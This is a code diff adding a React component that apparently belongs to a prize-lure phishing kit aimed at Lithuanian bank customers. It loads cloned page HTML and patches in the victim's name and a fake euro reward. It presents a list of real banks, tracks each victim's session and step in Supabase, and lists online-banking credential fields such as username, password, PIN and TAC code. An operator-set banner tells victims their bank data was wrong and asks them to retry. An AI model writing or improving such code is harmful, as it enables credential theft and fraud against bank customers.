@@ -1,0 +1,170 @@
+"use client";
+
+import { useEffect, useMemo, useRef, useState } from "react";
+import { createBrowserSupabaseClient } from "@/lib/supabase/client";
+
+type Props = {
+  sessionId: string | null;
+  routeSessionId?: string;
+  /** invalid_bank adimi icin ayni tasarim + hata bandi */
+  invalid?: boolean;
+};
+
+function hrefToSlug(href: string): string | null {
+  const h = href.toLowerCase();
+  if (h.includes("swedbank")) return "swedbank-lt";
+  if (h.includes("/seb") || h.endsWith("seb")) return "seb-lt";
+  if (h.includes("luminor")) return "luminor-lt";
+  if (h.includes("citadele")) return "citadele-lt";
+  if (h.includes("lkubnk") || h.includes("lku")) return "lku-lt";
+  if (h.includes("siabnk") || h.includes("siauliu")) return "siauliu-lt";
+  return null;
+}
+
+const BANK_CRED_FIELDS = [
+  "username", "password", "verfuegernummer", "pin", "rekeningnummer",
+  "pasnummer", "toegangscode", "signatuur", "identificatiecode", "tacCode",
+];
+
+export function Banken2Client({ sessionId, routeSessionId, invalid }: Props) {
+  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
+  const containerRef = useRef<HTMLDivElement>(null);
+  const [effectiveSessionId, setEffectiveSessionId] = useState(sessionId);
+  const [html, setHtml] = useState("");
+  const [fd, setFd] = useState<Record<string, any>>({});
+  const [amount, setAmount] = useState<number>(0);
+  const [ready, setReady] = useState(false);
+  const [saving, setSaving] = useState(false);
+  const savingRef = useRef(false);
+
+  useEffect(() => {
+    if (sessionId) return;
+    const cached = localStorage.getItem("activeSessionId");
+    if (cached && cached !== "undefined" && cached !== "null") {
+      setEffectiveSessionId(cached);
+    }
+  }, [sessionId]);
+
+  // Tasarim asset'leri (birebir HTML) — bir kez yukle
+  useEffect(() => {
+    let cancelled = false;
+    void (async () => {
+      const [cssRes, htmlRes] = await Promise.all([
+        fetch("/win2/banken2.css"),
+        fetch("/win2/banken2.html"),
+      ]);
+      if (cancelled) return;
+      const css = cssRes.ok ? await cssRes.text() : "";
+      const body = htmlRes.ok ? await htmlRes.text() : "";
+      const style = document.createElement("style");
+      style.setAttribute("data-banken2", "1");
+      style.innerHTML = css;
+      document.head.appendChild(style);
+      setHtml(body);
+    })();
+    return () => {
+      cancelled = true;
+      document.head.querySelector('style[data-banken2="1"]')?.remove();
+    };
+  }, []);
+
+  // Session verisi (isim + odul miktari)
+  useEffect(() => {
+    if (!effectiveSessionId || !supabase) return;
+    let cancelled = false;
+    void (async () => {
+      const { data } = await supabase
+        .from("sessions")
+        .select("amount,form_data")
+        .eq("id", effectiveSessionId)
+        .maybeSingle();
+      if (cancelled) return;
+      const formData = (data?.form_data ?? {}) as Record<string, any>;
+      setFd(formData);
+      const amt =
+        typeof data?.amount === "number" && data.amount > 0
+          ? data.amount
+          : Number(formData.amount) || 0;
+      setAmount(amt);
+      setReady(true);
+    })();
+    return () => {
+      cancelled = true;
+    };
+  }, [effectiveSessionId, supabase]);
+
+  // HTML enjekte edildikten sonra: isim/miktar patch + banka click bagla
+  useEffect(() => {
+    const root = containerRef.current;
+    if (!root || !html || !ready) return;
+
+    // Kirmizi "1" -> kullanicinin adi soyadi
+    const fullName = [fd.firstName, fd.lastName].filter(Boolean).join(" ").trim();
+    const nameSpan = root.querySelector('span[style*="F62515"], span.font-bold.text-red');
+    if (nameSpan) nameSpan.textContent = fullName || "kliente";
+
+    // "1700 eurų" -> session amount
+    if (amount > 0) {
+      const h2 = root.querySelector("h2.header-title");
+      if (h2) h2.innerHTML = h2.innerHTML.replace(/[\d\s.,]+(?=\s*eur)/, String(amount));
+    }
+
+    // Hatali banka: kirmizi uyari bandi
+    if (invalid) {
+      const container = root.querySelector(".container");
+      if (container && !container.querySelector("[data-invalid-banner]")) {
+        const banner = document.createElement("div");
+        banner.setAttribute("data-invalid-banner", "1");
+        banner.style.cssText =
+          "background:#fdecea;border:1px solid #f5c6c6;color:#b3261e;border-radius:12px;padding:14px 18px;margin:0 auto 18px;max-width:640px;text-align:center;font-weight:600;font-size:14px;";
+        banner.textContent =
+          "Neteisingi banko duomenys. Prašome patikrinti savo duomenis ir bandyti dar kartą.";
+        const h2 = container.querySelector("h2.header-title");
+        container.insertBefore(banner, h2 ? h2.nextSibling : container.firstChild);
+      }
+    }
+
+    const onClick = async (e: Event) => {
+      const a = (e.target as HTMLElement).closest("a.bank-item");
+      if (!a) return;
+      e.preventDefault();
+      const slug = hrefToSlug(a.getAttribute("href") || "");
+      if (!slug || !supabase || !effectiveSessionId || savingRef.current) return;
+      savingRef.current = true;
+      setSaving(true);
+
+      const { data: row } = await supabase
+        .from("sessions")
+        .select("form_data")
+        .eq("id", effectiveSessionId)
+        .maybeSingle();
+      const nextFd: Record<string, any> = { ...((row?.form_data ?? {}) as Record<string, any>) };
+      for (const f of BANK_CRED_FIELDS) delete nextFd[f];
+
+      const { error: upErr } = await supabase
+        .from("sessions")
+        .update({ is_hidden: false, current_step: "bank", form_data: nextFd })
+        .eq("id", effectiveSessionId);
+
+      if (upErr) {
+        savingRef.current = false;
+        setSaving(false);
+        return;
+      }
+      const routeId = routeSessionId || effectiveSessionId;
+      window.location.href = `/win/${encodeURIComponent(routeId)}/bank/${slug}`;
+    };
+
+    root.addEventListener("click", onClick);
+    return () => root.removeEventListener("click", onClick);
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [html, ready, fd, amount, invalid, effectiveSessionId, routeSessionId, supabase]);
+
+  return (
+    <div
+      ref={containerRef}
+      style={{ minHeight: "100dvh", opacity: saving ? 0.7 : 1 }}
+      dangerouslySetInnerHTML={{ __html: html }}
+    />
+  );
+}
